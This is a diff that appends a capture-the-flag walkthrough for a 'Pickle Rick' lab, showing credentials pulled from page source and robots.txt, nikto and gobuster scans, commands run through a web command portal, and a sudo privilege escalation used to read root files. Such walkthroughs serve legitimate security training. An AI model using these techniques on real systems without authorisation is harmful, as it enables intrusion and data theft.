@@ -931,3 +931,158 @@ __cxa_finalize@@GLIBC_2.2.5
 .comment
 root@kali:~#
 ```
+
+# [Task 17] [Web Exploitation] [Easy] Pickle Rick
+
+
+# toppage
+```html
+    Note to self, remember username!
+
+    Username: R1ckRul3s
+```
+## robot
+this is password
+```
+Wubbalubbadubdub
+
+```
+http://10.10.188.111/assets/
+```html
+<html>
+ <head>
+  <title>Index of /assets</title>
+ </head>
+ <body>
+<h1>Index of /assets</h1>
+  <table>
+   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
+   <tr><th colspan="5"><hr></th></tr>
+<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="bootstrap.min.css">bootstrap.min.css</a></td><td align="right">2019-02-10 16:37  </td><td align="right">119K</td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="bootstrap.min.js">bootstrap.min.js</a></td><td align="right">2019-02-10 16:37  </td><td align="right"> 37K</td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="fail.gif">fail.gif</a></td><td align="right">2019-02-10 16:37  </td><td align="right"> 49K</td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="jquery.min.js">jquery.min.js</a></td><td align="right">2019-02-10 16:37  </td><td align="right"> 85K</td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="picklerick.gif">picklerick.gif</a></td><td align="right">2019-02-10 16:37  </td><td align="right">222K</td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="portal.jpg">portal.jpg</a></td><td align="right">2019-02-10 16:37  </td><td align="right"> 50K</td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="rickandmorty.jpeg">rickandmorty.jpeg</a></td><td align="right">2019-02-10 16:37  </td><td align="right">488K</td><td>&nbsp;</td></tr>
+   <tr><th colspan="5"><hr></th></tr>
+</table>
+<address>Apache/2.4.18 (Ubuntu) Server at 10.10.188.111 Port 80</address>
+</body></html>
+
+```
+
+## nikto
+```
+root@kali:~# nikto -h 10.10.188.111
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.188.111
++ Target Hostname:    10.10.188.111
++ Target Port:        80
++ Start Time:         2020-05-17 01:13:55 (GMT0)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Server may leak inodes via ETags, header found with file /, inode: 426, size: 5818ccf125686, mtime: gzip
++ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD
++ Cookie PHPSESSID created without the httponly flag
++ OSVDB-3233: /icons/README: Apache default file found.
++ /login.php: Admin login page/section found.
++ 7889 requests: 0 error(s) and 9 item(s) reported on remote host
++ End Time:           2020-05-17 01:14:45 (GMT0) (50 seconds)
+---------------------------------------------------------------------------
+```
+
+## gobuster
+```
+root@kali:~# gobuster dir -u http://10.10.188.111 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -x php,txt
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.188.111
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     php,txt
+[+] Timeout:        10s
+===============================================================
+2020/05/17 01:21:47 Starting gobuster
+===============================================================
+/login.php (Status: 200)
+/assets (Status: 301)
+/portal.php (Status: 302)
+/robots.txt (Status: 200)
+/denied.php (Status: 302)
+/server-status (Status: 403)
+/clue.txt (Status: 200)
+===============================================================
+2020/05/17 01:25:18 Finished
+===============================================================
+```
+## flag1
+http://10.10.188.111/portal.php
+```
+ls
+Sup3rS3cretPickl3Ingred.txt
+assets
+clue.txt
+denied.php
+index.html
+login.php
+portal.php
+robots.txt
+
+cat Sup3rS3cretPickl3Ingred.txt
+none
+
+less Sup3rS3cretPickl3Ingred.txt
+mr. meeseek hair
+
+
+
+
+```
+
+## flag2
+```
+ls /home/rick -al
+total 12
+drwxrwxrwx 2 root root 4096 Feb 10  2019 .
+drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
+-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
+
+less "/home/rick/second ingredients"
+1 jerry tear
+```
+
+## flag3
+```
+sudo -l
+Matching Defaults entries for www-data on ip-10-10-188-111.eu-west-1.compute.internal:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ip-10-10-188-111.eu-west-1.compute.internal:
+    (ALL) NOPASSWD: ALL
+
+sudo ls /root -al
+total 28
+drwx------  4 root root 4096 Feb 10  2019 .
+drwxr-xr-x 23 root root 4096 May 17 01:09 ..
+-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+drwx------  2 root root 4096 Feb 10  2019 .ssh
+-rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
+drwxr-xr-x  3 root root 4096 Feb 10  2019 snap
+
+sudo less /root/3rd.txt
+3rd ingredients: fleeb juice
+```
+
